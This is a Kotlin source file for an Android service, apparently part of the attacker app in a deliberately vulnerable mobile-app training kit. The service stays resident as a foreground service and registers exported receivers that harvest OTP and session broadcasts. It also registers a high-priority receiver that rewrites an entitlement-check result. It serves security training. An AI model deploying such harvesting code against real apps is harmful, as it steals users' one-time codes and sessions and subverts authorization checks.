package com.dvma.attacker

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder

/**
 * Keeps the [OtpLeakReceiver] registered persistently so the attacker harvests
 * DVMA's unprotected broadcast even while DVMA (not this app) is in the
 * foreground.
 *
 * FOR AUTHORIZED SECURITY-TRAINING USE ONLY.
 *
 * Android 8+ does not deliver implicit broadcasts to most manifest-declared
 * receivers, so a real co-resident attacker keeps a *runtime*-registered
 * receiver alive via a long-running foreground service. This models that: it
 * is exactly how such spyware stays resident, and it makes the cross-app leak
 * deterministic for the demo/harness.
 */
class OtpHarvestService : Service() {

    private val receiver = OtpLeakReceiver()
    private val broadcastHarvest = BroadcastHarvestReceiver()
    private var registered = false

    override fun onCreate() {
        super.onCreate()
        AttackerCapture.externalDir = getExternalFilesDir(null)
        startForeground(NOTIF_ID, buildNotification())
        registerExported(receiver, IntentFilter(OtpLeakReceiver.ACTION_OTP))
        // Passive receivers for the broadcasts DVMA emits to "the default app".
        registerExported(
            broadcastHarvest,
            IntentFilter().apply {
                addAction(Dvma.ACTION_SHARE_SESSION)
                addAction(Dvma.ACTION_ROLE_DELEGATE)
            },
        )
        // Higher-priority filter so this receiver runs before DVMA's final
        // receiver and can rewrite the ordered-broadcast result.
        registerExported(
            broadcastHarvest,
            IntentFilter(Dvma.ACTION_ENTITLEMENT_CHECK).apply { priority = 999 },
        )
        registered = true
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int =
        START_STICKY

    override fun onDestroy() {
        if (registered) {
            runCatching { unregisterReceiver(receiver) }
            runCatching { unregisterReceiver(broadcastHarvest) }
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun registerExported(r: android.content.BroadcastReceiver, filter: IntentFilter) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(r, filter, Context.RECEIVER_EXPORTED)
        } else {
            @Suppress("UnspecifiedRegisterReceiverFlag")
            registerReceiver(r, filter)
        }
    }

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val mgr = getSystemService(NotificationManager::class.java)
            mgr.createNotificationChannel(
                NotificationChannel(
                    CHANNEL_ID,
                    "DVMA Attacker harvest",
                    NotificationManager.IMPORTANCE_LOW,
                )
            )
        }
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setContentTitle("DVMA Attacker")
            .setContentText("Listening for cross-app OTP broadcasts")
            .setSmallIcon(android.R.drawable.stat_sys_warning)
            .setOngoing(true)
            .build()
    }

    private companion object {
        const val CHANNEL_ID = "dvma_attacker_harvest"
        const val NOTIF_ID = 1001
    }
}
